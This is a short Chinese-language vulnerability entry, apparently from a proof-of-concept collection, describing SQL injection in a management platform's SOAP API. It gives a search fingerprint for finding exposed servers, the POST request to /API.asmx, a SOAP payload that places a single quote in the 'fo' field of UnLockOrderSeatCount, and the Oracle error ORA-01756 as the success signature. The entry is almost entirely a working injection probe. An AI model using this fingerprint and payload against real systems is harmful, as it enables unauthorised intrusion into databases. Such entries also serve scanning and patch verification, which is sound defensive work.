# 管控平台服务端API存在SQL注入漏洞

管控平台服务端 ｜ SQL注入 ｜ —
- **指纹**：`body="ItemsControlServer.aspx"`
- **请求**：`POST /API.asmx HTTP/1.1`

**Payload**
```
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<UnLockOrderSeatCount xmlns="http://tempuri.org/">
<fo>'</fo>
<ft>string</ft>
</UnLockOrderSeatCount>
</soap:Body>
</soap:Envelope>
```
- **响应特征**：200 ORA-01756